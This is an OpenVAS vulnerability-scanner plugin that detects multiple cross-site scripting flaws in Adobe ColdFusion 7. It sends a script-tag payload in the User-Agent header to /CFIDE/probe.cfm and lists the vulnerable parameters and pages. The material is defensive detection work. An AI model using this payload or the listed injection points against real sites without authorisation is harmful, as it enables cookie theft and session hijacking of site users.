###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_adobe_coldfusion_multiple_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Adobe ColdFusion Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in
  the context of an affected site.
  Impact Level: Application";
tag_affected = "Adobe ColdFusion version 7";
tag_insight = "Multiple flaws are caused by improper validation of user-supplied input
  passed via the 'component' parameter in componentdetail.cfm, 'method'
  parameter in cfcexplorer.cfc and header 'User-Agent' in cfcexplorer.cfc,
  probe.cfm, Application.cfm, _component_cfcToHTML.cfm and
  _component_cfcToMCDL.cfm, that allows attackers to execute arbitrary HTML
  and script code on the web server.";
tag_solution = "No solution or patch is available as of 30th September 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.adobe.com/products/coldfusion-family.html";
tag_summary = "The host is running Adobe ColdFusion and is prone to multiple cross
  site scripting vulnerabilities.";

if(description)
{
  script_id(902576);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-30 15:58:03 +0200 (Fri, 30 Sep 2011)");
  script_bugtraq_id(49787);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Adobe ColdFusion Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://websecurity.com.ua/5243/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Sep/285");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105344/coldfusion-xssdisclose.txt");

  script_description(desc);
  script_summary("Determine if Adobe ColdFusion is vulnerable to Cross Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_coldfusion_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Confirm ColdFusion
if(!get_kb_item(string("coldfusion/", port, "/installed"))){
  exit(0);
}

## Construct Attack Request
req = string("GET /CFIDE/probe.cfm HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent: <script>alert(document.cookie)</script>\r\n\r\n");

## Try XSS Attack
res = http_send_recv(port:port, data:req);

## Confirm Exploit Worked by Checking The Response.
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
  ('><script>alert(document.cookie)</script>' >< res)) {
  security_warning(port);
}
